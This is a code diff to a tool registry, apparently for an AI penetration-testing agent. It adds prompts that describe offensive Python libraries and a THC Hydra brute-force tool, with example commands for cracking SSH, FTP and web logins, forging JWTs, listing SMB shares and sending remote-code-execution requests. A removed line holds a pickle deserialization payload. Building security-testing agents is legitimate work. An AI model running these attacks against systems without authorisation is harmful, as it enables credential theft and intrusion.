@@ -153,8 +153,47 @@ TOOL_REGISTRY = {
             '   - **Supported languages:** python (default), bash, ruby, perl, c, cpp\n'
             '   - **Timeout:** 120s execution. Compiled languages: 60s compile + 120s run.\n'
             '   - **Files persist** at /tmp/{filename}.{ext} — re-runnable via kali_shell if needed.\n'
+            '   - **Pre-installed Python libraries** (import directly, no pip needed):\n'
+            '     - **requests** — HTTP requests for web exploitation, API interaction, form submission\n'
+            '     - **beautifulsoup4** (`from bs4 import BeautifulSoup`) — Parse HTML responses to extract tokens, forms, hidden fields, data\n'
+            '     - **pycryptodome** (`from Crypto.Cipher import AES`, etc.) — Encrypt/decrypt payloads, hash manipulation, custom crypto attacks\n'
+            '     - **PyJWT** (`import jwt`) — Forge/tamper/decode JWT tokens, algorithm confusion attacks (none/HS256/RS256)\n'
+            '     - **paramiko** — Programmatic SSH sessions, SFTP file transfer, SSH tunneling for post-exploitation\n'
+            '     - **impacket** — Windows/AD attacks: SMB relay, NTLM auth, Kerberos, secretsdump, psexec, wmiexec, dcomexec\n'
+            '     - **pwntools** (`from pwn import *`) — Binary exploitation, remote TCP connections, shellcode generation, struct packing, ROP chains\n'
             '   - Example: code="import requests\\nr=requests.post(\'http://target/rce\', data={\'cmd\': \'id\'})\\nprint(r.text)"\n'
-            '   - Example: code="import pickle,base64,os\\nclass E:\\n  def __reduce__(self):\\n    return(os.system,(\'id\',))\\nprint(base64.b64encode(pickle.dumps(E())).decode())"'
+            '   - Example: code="import requests\\nfrom bs4 import BeautifulSoup\\nr=requests.get(\'http://target/login\')\\nsoup=BeautifulSoup(r.text,\'html.parser\')\\ntoken=soup.find(\'input\',{\'name\':\'csrf\'})\\nprint(token[\'value\'])"\n'
+            '   - Example: code="import jwt\\ntoken=jwt.encode({\'user\':\'admin\',\'role\':\'admin\'},\'secret\',algorithm=\'HS256\')\\nprint(token)"\n'
+            '   - Example: code="from impacket.smbconnection import SMBConnection\\nconn=SMBConnection(\'target\',\'target\')\\nconn.login(\'user\',\'pass\')\\nshares=conn.listShares()\\nfor s in shares:\\n  print(s[\'shi1_netname\'])"\n'
+            '   - Example: code="from pwn import *\\nr=remote(\'target\',1337)\\nr.sendline(b\'payload\')\\nprint(r.recvall().decode())"'
+        ),
+    },
+    "execute_hydra": {
+        "purpose": "Brute force password cracking (50+ protocols)",
+        "when_to_use": "Credential brute force attacks (SSH, FTP, SMB, RDP, HTTP, MySQL, etc.)",
+        "args_format": '"args": "hydra arguments without \'hydra\' prefix"',
+        "description": (
+            '**execute_hydra** (Brute Force Password Cracking)\n'
+            '   - THC Hydra — fast, parallelised network login cracker\n'
+            '   - Stateless: runs, reports found credentials, and exits\n'
+            '   - **50+ supported protocols:** ssh, ftp, rdp, smb, vnc, mysql, mssql, postgres,\n'
+            '     redis, mongodb, telnet, pop3, imap, smtp, http-get, http-post-form, and more\n'
+            '   - **Key flags:**\n'
+            '     - `-l USER` / `-L FILE` — single username / username list\n'
+            '     - `-p PASS` / `-P FILE` — single password / password list\n'
+            '     - `-C FILE` — colon-separated `user:pass` combo file\n'
+            '     - `-e nsr` — try null password (n), login-as-pass (s), reversed login (r)\n'
+            '     - `-t TASKS` — parallel connections (default 16; SSH max 4, RDP max 1)\n'
+            '     - `-f` — stop on first valid credential found\n'
+            '     - `-s PORT` — non-default port\n'
+            '     - `-S` — use SSL/TLS\n'
+            '     - `-V` — verbose (show each attempt)\n'
+            '   - **Syntax:** `[flags] protocol://target[:port]`\n'
+            '   - **HTTP POST Form special syntax:** `[flags] target http-post-form "/path:params:F=failure_string"`\n'
+            '     - Use `^USER^` and `^PASS^` as placeholders in form params\n'
+            '   - Example: "-l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 -f -e nsr -V ssh://10.0.0.5"\n'
+            '   - Example: "-l admin -P passwords.txt -f -V ftp://10.0.0.5"\n'
+            '   - Example: "-l admin -P passwords.txt -f -V 10.0.0.5 http-post-form \\"/login:user=^USER^&pass=^PASS^:F=Invalid\\""'
         ),
     },
     "metasploit_console": {
@@ -167,7 +206,7 @@ TOOL_REGISTRY = {
             '   - Module context and sessions persist between calls\n'
             '   - **Chain commands with `;` (semicolons)**: `set RHOSTS 1.2.3.4; set RPORT 22; set USERNAME root`\n'
             '   - **DO NOT use `&&` or `||`** — these shell operators are NOT supported!\n'
-            '   - Metasploit state is auto-reset on first use in each session\n'
+            '   - Sessions persist across conversations — use msf_restart only if you need a clean state\n'
             '   - Simple system commands (curl, wget, python3) can be run directly in msfconsole\n'
             '   - **msfconsole Shell Limitations (CRITICAL):**\n'
             '     - NO variable assignment: `VAR=$(command)` does NOT work\n'
@@ -175,6 +214,19 @@ TOOL_REGISTRY = {
             '     - Complex quoting breaks — use file-based approach instead:\n'
             '       `echo \'script\' > /opt/output/gen.py` then `python3 /opt/output/gen.py`\n'
             '     - If a command fails due to quoting: switch to file-based approach immediately'
+        ),
+    },
+    "msf_restart": {
+        "purpose": "Restart msfconsole",
+        "when_to_use": "Reset Metasploit to a clean state (kills ALL sessions)",
+        "args_format": '(no arguments)',
+        "description": (
+            '**msf_restart** (Metasploit full reset)\n'
+            '   - Kills the msfconsole process and starts a fresh one\n'
+            '   - **WARNING: Kills ALL active sessions and clears all module config**\n'
+            '   - Use only when you need a completely clean Metasploit state\n'
+            '   - Takes 60-120s to restart — do not use casually\n'
+            '   - Do NOT use if there are active sessions you want to keep'
         ),
     },
 }
